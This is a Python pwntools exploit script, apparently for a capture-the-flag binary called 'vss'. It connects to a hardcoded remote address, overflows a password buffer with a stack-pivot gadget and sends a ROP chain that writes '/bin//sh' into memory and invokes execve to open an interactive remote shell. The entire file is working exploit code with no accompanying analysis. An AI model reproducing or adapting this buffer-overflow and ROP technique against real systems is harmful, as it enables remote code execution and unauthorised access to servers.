from pwn import *

context(log_level="debug")

# io = process('./vss')
# io = remote('121.40.56.102',2333)
# io = remote('127.0.0.1',10001)
io = remote('115.28.35.168',10002)

####
from struct import pack

# Padding goes here
p = ''
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x000000000046f208) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046b8d1) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401823) # pop rdi ; ret
p += pack('<Q', 0x00000000006c4080) # @ .data
p += pack('<Q', 0x0000000000401937) # pop rsi ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000043ae05) # pop rdx ; ret
p += pack('<Q', 0x00000000006c4088) # @ .data + 8
p += pack('<Q', 0x000000000041bd1f) # xor rax, rax ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045e790) # add rax, 1 ; ret
p += pack('<Q', 0x000000000045f2a5) # syscall ; ret
####
l_addr = 0x4469f9
add_esp = 0x4976CF
# gdb.attach(io,'b*0x4011AF\nb*0x4010DC\nb*0x40115E\nc')
io.recvuntil('assword:\n')
payload =''
payload+='py'+'a'*(0x40-2+0x8)+p64(l_addr)[:7]+p64(add_esp)
payload+='\x61'*(0x80-len(payload))
io.sendline(payload+p)
io.interactive()